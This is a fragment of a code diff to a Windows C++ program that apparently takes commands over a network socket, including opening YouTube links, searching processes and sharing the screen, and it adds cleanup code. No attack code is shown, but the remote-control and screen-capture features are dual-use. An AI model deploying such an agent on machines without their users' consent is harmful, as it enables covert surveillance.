-                    send(sock, error_msg.c_str(), error_msg.length(), 0);
-                }
-                catch (...)
-                {
-                    std::string error_msg = "Unknown error occurred while opening YouTube";
-                    std::cout << error_msg << std::endl;
-                    send(sock, error_msg.c_str(), error_msg.length(), 0);
-                }
+                response = open_youtube_without_ads(url);
+                send(sock, response.c_str(), response.length(), 0);
             }
             else if (strncmp(buffer, "search_process ", 15) == 0)
             {
@@ -2311,4 +2904,12 @@ int main()
             }
         }
     }
+    
+    // Cleanup (this should never be reached due to infinite loop, but good practice)
+    stop_screen_sharing(); // Stop any active screen sharing
+    DeleteCriticalSection(&g_screen_sharing_cs);
+    WSACleanup();
+    Gdiplus::GdiplusShutdown(gdiplusToken);
+    
+    return 0;
 }
